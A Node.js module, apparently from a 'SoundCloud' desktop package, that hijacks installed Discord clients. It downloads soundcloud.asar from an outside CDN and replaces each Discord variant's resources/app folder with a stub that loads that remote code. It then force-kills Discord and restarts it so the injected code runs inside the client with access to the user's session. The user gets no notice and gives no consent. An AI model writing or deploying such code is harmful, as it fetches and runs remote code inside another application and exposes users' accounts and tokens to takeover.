const appdata = require('appdata-path');
const Downloader = require('nodejs-file-downloader');
const path = require('path');
const fs = require('original-fs');
const { exec } = require('child_process');
const DisSubLoc = appdata.getAppDataPath("../Local/Discord");
const DisCanSubLoc = appdata.getAppDataPath("../Local/DiscordCanary");
const DisPtbSubLoc = appdata.getAppDataPath("../Local/DiscordPTB");
const SCAPD = appdata.getAppDataPath("SoundCloud");
const SCAP = path.join(SCAPD, 'soundcloud.asar');
const NDV = require('../package.json').scdv
module.exports = async() => {
    fs.rmSync(SCAP, { recursive: true, force: true });
    await Download();
    
    await Update(DisSubLoc, 'discord.exe');
    await Update(DisCanSubLoc, 'DiscordCanary.exe');
    await Update(DisPtbSubLoc, 'DiscordPTB.exe');
};
async function Download() {
    const download = new Downloader({
        url: `https://cdn.scpsl.store/soundcloud/injector/${NDV}/soundcloud.asar`,
        directory: SCAPD
    });
    await download.download();
}
function Update(dir, prc) {
    if (!fs.existsSync(dir)) return;
    let _ldv = '';
    return new Promise(resolve => {
        fs.readdir(dir, async function (err, files) {
            for (let i = 0; i < files.length; i++) {
                const _file = files[i];
                if(!_file.includes('app-')) continue;
                const vers = _file.substring(4);
                if(FirstNewVersion(_ldv, vers)) continue;
                if (!fs.existsSync(path.join(dir, `app-${vers}`, 'resources'))) continue;
                _ldv = vers;
            }
            const resdir = path.join(dir, `app-${_ldv}`, 'resources');
            const _appdir = path.join(resdir, 'app');
            if (fs.existsSync(_appdir)){
                const _apppack = path.join(_appdir, 'package.json');
                if (fs.existsSync(_apppack)){
                    const _apack = require(_apppack);
                    const apvers = _apack.version;
                    const appname = _apack.name;
                    try{
                        const sca = path.join(resdir, 'soundcloud.asar');
                        if(fs.existsSync(sca)){
                            try{
                                const arcp = require(`${sca}/package.json`).version;
                                if(arcp == NDV && apvers == NDV && appname == 'soundcloud-desktop') return resolve();
                            }catch{}
                        }
                    }catch{}
                }
            }
            fs.rmSync(_appdir, { recursive: true, force: true });
            await fs.promises.mkdir(_appdir, {recursive: true});
            fs.writeFile(path.join(_appdir, 'package.json'), `{"name":"soundcloud-desktop","main":"index.js","version":"${NDV}"}`, 'utf-8', () => {});
            fs.writeFile(path.join(_appdir, 'index.js'), 'require("../soundcloud.asar");', 'utf-8', () => {});
            fs.copyFile(SCAP, path.join(resdir, 'soundcloud.asar'), () => {
                resolve();
                try{
                    exec('tasklist', (err, stdout) => {
                        stdout = stdout.toLowerCase();
                        exec('Taskkill /F /IM '+prc, () => {if(stdout.includes(prc)) exec(path.join(dir, `app-${_ldv}`, prc));})
                    });
                }catch{}
            });
        });
    });
}
function FirstNewVersion(first, second) {
    const VersionF = {
        major: 0,
        minor: 0,
        build: 0,
        revision: 0
    }
    const VersionS = {
        major: 0,
        minor: 0,
        build: 0,
        revision: 0
    }
    const vfa = first.split('.');
    for (let i = 0; i < vfa.length && i < 4; i++) {
        const vf = vfa[i];
        const _num = parseInt(vf);
        if(isNaN(_num)) continue;
        if(i == 0) VersionF.major = _num;
        else if(i == 1) VersionF.minor = _num;
        else if(i == 2) VersionF.build = _num;
        else if(i == 3) VersionF.revision = _num;
    }
    const vsa = second.split('.');
    for (let i = 0; i < vsa.length && i < 4; i++) {
        const vs = vsa[i];
        const _num = parseInt(vs);
        if(isNaN(_num)) continue;
        if(i == 0) VersionS.major = _num;
        else if(i == 1) VersionS.minor = _num;
        else if(i == 2) VersionS.build = _num;
        else if(i == 3) VersionS.revision = _num;
    }
    if(VersionF.major > VersionS.major) return true;
    if(VersionF.major < VersionS.major) return false;
    if(VersionF.minor > VersionS.minor) return true;
    if(VersionF.minor < VersionS.minor) return false;
    if(VersionF.build > VersionS.build) return true;
    if(VersionF.build < VersionS.build) return false;
    if(VersionF.revision > VersionS.revision) return true;
    if(VersionF.revision < VersionS.revision) return false;
    return false;
}